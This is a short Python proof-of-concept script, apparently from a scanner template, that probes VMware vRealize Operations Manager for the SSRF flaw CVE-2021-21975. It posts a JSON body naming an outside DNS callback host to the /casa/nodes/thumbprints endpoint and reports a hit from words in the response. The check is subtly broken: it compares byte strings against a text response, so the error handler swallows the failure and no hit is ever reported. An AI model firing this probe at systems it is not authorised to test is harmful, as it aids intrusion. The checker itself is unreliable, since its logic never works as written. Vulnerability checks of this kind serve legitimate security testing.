#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "https://" + ip + ":" + port
    payload = "/casa/nodes/thumbprints"                                   #填写payload
    header = {
        "Content-Type": "application/json;charset=UTF-8"
    }                                                               #填写header头
    data = "[\"b8167902.dns.bypass.eu.org.\"]"                                               #填写data数据
    try:
        ssl = requests.session()
        req = ssl.post(url=target+payload,headers=header,data=data,timeout=3,verify=False)

        if req.status_code == 200:
            if (b'error_message' in req.text) and  (b'thumbprint' in req.text) and (b'address' in req.text):              #填写判断条件
                logging.info("[+] {} find VMWare_Operations_vRealize_Operations_Manager_API_SSRF_CVE_2021_21975".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found VMWare_Operations_vRealize_Operations_Manager_API_SSRF_CVE_2021_21975".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)